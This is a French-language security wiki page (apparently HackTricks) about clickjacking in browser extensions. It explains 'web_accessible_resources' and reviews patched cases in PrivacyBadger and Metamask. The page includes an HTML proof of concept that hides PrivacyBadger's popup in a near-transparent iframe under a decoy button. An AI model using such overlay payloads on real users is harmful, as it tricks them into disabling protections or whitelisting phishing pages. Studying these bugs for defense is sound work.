# BrowExt - ClickJacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informations de base

Cette page va exploiter une vuln√©rabilit√© de ClickJacking dans une extension de navigateur.\
Si vous ne savez pas ce qu'est le ClickJacking, consultez :

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Les extensions contiennent le fichier **`manifest.json`** et ce fichier JSON a un champ `web_accessible_resources`. Voici ce que disent [les docs de Chrome](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) √† ce sujet :

> Ces ressources seraient alors disponibles dans une page web via l'URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, qui peut √™tre g√©n√©r√©e avec la **`extension.getURL method`**. Les ressources autoris√©es sont servies avec des en-t√™tes CORS appropri√©s, donc elles sont disponibles via des m√©canismes comme XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Les **`web_accessible_resources`** dans une extension de navigateur ne sont pas seulement accessibles via le web ; elles fonctionnent √©galement avec les privil√®ges inh√©rents de l'extension. Cela signifie qu'elles ont la capacit√© de :

* Changer l'√©tat de l'extension
* Charger des ressources suppl√©mentaires
* Interagir avec le navigateur dans une certaine mesure

Cependant, cette fonctionnalit√© pr√©sente un risque de s√©curit√©. Si une ressource dans **`web_accessible_resources`** a une fonctionnalit√© significative, un attaquant pourrait potentiellement int√©grer cette ressource dans une page web externe. Les utilisateurs non m√©fiants visitant cette page pourraient activer involontairement cette ressource int√©gr√©e. Une telle activation pourrait entra√Æner des cons√©quences inattendues, en fonction des autorisations et des capacit√©s des ressources de l'extension.

## Exemple PrivacyBadger

Dans l'extension PrivacyBadger, une vuln√©rabilit√© a √©t√© identifi√©e li√©e au r√©pertoire `skin/` √©tant d√©clar√© comme `web_accessible_resources` de la mani√®re suivante (Consultez le [post de blog original](https://blog.lizzie.io/clickjacking-privacy-badger.html)) :
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Cette configuration a conduit √† un probl√®me de s√©curit√© potentiel. Plus pr√©cis√©ment, le fichier `skin/popup.html`, qui est rendu lors de l'interaction avec l'ic√¥ne PrivacyBadger dans le navigateur, pourrait √™tre int√©gr√© dans un `iframe`. Cette int√©gration pourrait √™tre exploit√©e pour tromper les utilisateurs en les incitant √† cliquer involontairement sur "D√©sactiver PrivacyBadger pour ce site Web". Une telle action compromettrait la vie priv√©e de l'utilisateur en d√©sactivant la protection PrivacyBadger et en soumettant potentiellement l'utilisateur √† un suivi accru. Une d√©monstration visuelle de cette exploitation peut √™tre vue dans un exemple vid√©o de ClickJacking fourni √† [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Pour rem√©dier √† cette vuln√©rabilit√©, une solution simple a √©t√© mise en ≈ìuvre : la suppression de `/skin/*` de la liste des `web_accessible_resources`. Ce changement a efficacement att√©nu√© le risque en veillant √† ce que le contenu du r√©pertoire `skin/` ne puisse pas √™tre accessible ou manipul√© via des ressources accessibles sur le web.

La solution √©tait simple : **supprimer `/skin/*` des `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Exemple Metamask

Un [**article de blog sur un ClickJacking dans metamask peut √™tre trouv√© ici**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Dans ce cas, Metamask a corrig√© la vuln√©rabilit√© en v√©rifiant que le protocole utilis√© pour y acc√©der √©tait **`https:`** ou **`http:`** (pas **`chrome:`** par exemple) :

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Un autre ClickJacking corrig√©** dans l'extension Metamask √©tait que les utilisateurs pouvaient **Cliquer pour ajouter √† la liste blanche** lorsqu'une page √©tait suspecte d'√™tre un phishing √† cause de `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Comme cette page √©tait vuln√©rable au Clickjacking, un attaquant pouvait en abuser en montrant quelque chose de normal pour amener la victime √† cliquer pour l'ajouter √† la liste blanche sans s'en rendre compte, puis revenir √† la page de phishing qui sera ajout√©e √† la liste blanche.

## Exemple Steam Inventory Helper

V√©rifiez la page suivante pour voir comment un **XSS** dans une extension de navigateur a √©t√© encha√Æn√© avec une vuln√©rabilit√© **ClickJacking** :

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
